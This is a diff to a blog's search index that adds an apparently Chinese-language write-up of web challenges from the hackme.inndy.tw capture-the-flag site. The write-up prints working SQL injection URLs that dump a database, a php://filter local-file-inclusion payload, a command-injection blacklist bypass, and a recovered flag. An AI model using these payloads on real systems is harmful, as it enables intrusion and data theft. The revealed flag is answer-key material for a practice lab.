@@ -1,10 +1,61 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>1</title>
-    <url>/2020/04/10/1/</url>
-    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;h1&gt;A First Level Header&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;h2&gt;A Second Level Header&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;p&gt;Now is the time for all good men to come to</span><br><span class="line">the aid of their country. This is just a</span><br><span class="line">regular paragraph.&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;The quick brown fox jumped over the lazy</span><br><span class="line">dog&#39;s back.&lt;&#x2F;p&gt;</span><br><span class="line">&lt;h3&gt;Header 3&lt;&#x2F;h3&gt;</span><br><span class="line">&lt;blockquote&gt;</span><br><span class="line">&lt;p&gt;This is a blockquote.&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;This is the second paragraph in the blockquote.&lt;&#x2F;p&gt;</span><br><span class="line">&lt;h2&gt;This is an H2 in a blockquote&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;&#x2F;blockquote&gt;</span><br></pre></td></tr></table></figure>
+    <title>hackme</title>
+    <url>/2020/04/16/hackme/</url>
+    <content><![CDATA[<h3 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h3><p>F12查看源代码</p>
+<p>（有点难找，建议Ctrl+F）</p>
+<h3 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a>guestbook</h3><p>打开Message List发现空白</p>
+<p>打开New Post提交</p>
+<p>再次打开Message List查询提交内容</p>
+<p> 在id值后加上” ’ “测试是否存在测试点网页报错说明存在注入点 </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;gb&#x2F;?mod&#x3D;read&amp;id&#x3D;17 order by 4 --+</span><br></pre></td></tr></table></figure>
 
-]]></content>
+<p>发现有四列</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;gb&#x2F;?mod&#x3D;read&amp;id&#x3D;-17 union select 1,2,3,4--+</span><br></pre></td></tr></table></figure>
+
+<p>发现第三列可回显</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;gb&#x2F;?mod&#x3D;read&amp;id&#x3D;-17 union select 1,2,database(),4--+</span><br></pre></td></tr></table></figure>
+
+<p>查看得到数据库为 g8</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;gb&#x2F;?mod&#x3D;read&amp;id&#x3D;-17%20union%20select%201,2,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),4--+</span><br></pre></td></tr></table></figure>
+
+<p>查看得到表名为 flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;gb&#x2F;?mod&#x3D;read&amp;id&#x3D;-17%20union%20select%201,2,(select column_name from information_schema.columns where table_name&#x3D;&#39;flag&#39; limit 1,1),4--+</span><br></pre></td></tr></table></figure>
+
+<p>查看得到列名为 flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;gb&#x2F;?mod&#x3D;read&amp;id&#x3D;-17%20union%20select%201,2,(select flag from flag limit 1,1),4--+</span><br></pre></td></tr></table></figure>
+
+<p>最后得到flag</p>
+<h3 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h3><p> 用php://filter绕过读取本地文件 </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;lfi&#x2F;?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;pages&#x2F;flag</span><br></pre></td></tr></table></figure>
+
+<p>得到一行base64</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Q2FuIHlvdSByZWFkIHRoZSBmbGFnPD9waHAgcmVxdWlyZSgnY29uZmlnLnBocCcpOyA&#x2F;Pj8K</span><br></pre></td></tr></table></figure>
+
+<p>base64解码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Can you read the flag&lt;?php require(&#39;config.php&#39;); ?&gt;?</span><br></pre></td></tr></table></figure>
+
+<p>构造payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;lfi&#x2F;?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;pages&#x2F;config</span><br></pre></td></tr></table></figure>
+
+<p>得到base64</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PD9waHAKCiRmbGFnID0gIkZMQUd7WW9vb29vb19MRklfZzAwZF8yY1h4c1hTWVA5RVZMcklvfSI7Cg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>解码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $flag &#x3D; &quot;FLAG&#123;Yoooooo_LFI_g00d_2cXxsXSYP9EVLrIo&#125;&quot;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="homepage"><a href="#homepage" class="headerlink" title="homepage"></a>homepage</h3><p>打开网页打开chrome浏览器console扫描二维码即可</p>
+<h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><p> 程序在$blacklist里面过滤了很多东西，但是还是可以用“两个反引号来绕过限制执行系统命令 </p>
+<p> 首先输入<code>ls</code>来查看目录 </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping: unknown host flag.php index.php</span><br></pre></td></tr></table></figure>
+
+<p> 所以flag一定是在flag.php里面了，所以要尝试去读取flag.php  </p>
+<p>但是cat被禁掉了，所以要用tail来读取flag.php </p>
+<p> 字符串里面不能出现flag和php这两个字符串，所以就要用通配符来读取，所以最后的payload是：<code>tail *fl*.ph*</code> </p>
+<p>[通配符概念][<a href="https://baike.baidu.com/item/%E9%80%9A%E9%85%8D%E7%AC%A6]" target="_blank" rel="noopener">https://baike.baidu.com/item/%E9%80%9A%E9%85%8D%E7%AC%A6]</a></p>
+<h4 id="scoreboard"><a href="#scoreboard" class="headerlink" title="scoreboard"></a>scoreboard</h4><p>burpsuite抓包</p>
+<p>找到header中x-flag</p>
+<h5 id="Login-as-Admin-0"><a href="#Login-as-Admin-0" class="headerlink" title="Login as Admin 0"></a>Login as Admin 0</h5>]]></content>
   </entry>
 </search>
